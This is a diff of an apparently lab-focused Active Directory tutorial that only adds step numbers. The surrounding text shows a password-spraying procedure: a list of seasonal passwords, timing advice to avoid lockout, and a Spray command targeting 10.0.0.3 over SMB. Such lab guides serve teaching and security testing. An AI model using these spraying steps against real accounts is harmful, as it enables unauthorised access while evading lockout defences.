@@ -66,7 +66,7 @@ It is recommended to not spray more then one password every 30 minutes to preven
 
 #### Spraying a small list of passwords
 
-To spray a list of passwords we can use Spray. First create a `passwords.txt` file and copy the following passwords:
+1. To spray a list of passwords we can use Spray. First create a `passwords.txt` file and copy the following passwords:
 
 ```
 Spring2022!
@@ -78,7 +78,7 @@ Bank2022!
 AmsterdamBank2022!
 ```
 
-Since we don't want to lock any accounts we will try one password every 31 minutes by using the following command:
+2\. Since we don't want to lock any accounts we will try one password every 31 minutes by using the following command:
 
 ```
 bash spray.sh smb 10.0.0.3 ~/adlab/users.txt ~/adlab/passwords.txt 1 31 passwordspray.txt
